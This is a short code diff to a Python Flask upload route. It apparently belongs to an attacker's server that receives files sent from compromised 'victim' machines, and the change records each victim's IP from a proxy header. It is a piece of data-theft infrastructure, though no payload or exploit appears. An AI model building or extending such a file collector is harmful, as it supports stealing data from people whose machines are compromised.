@@ -24,7 +24,8 @@ def up():
     """
     Route for uploading files, the file then will be handled by the Victim class.
     """
-    CurrentVictim = Victim(request.remote_addr)
+    VictimIP = request.headers.get("X-Real-IP")
+    CurrentVictim = Victim(VictimIP)
     NameHeader = request.headers.get("name")
     if NameHeader is None or len(request.data) == 0:
         return '', 400
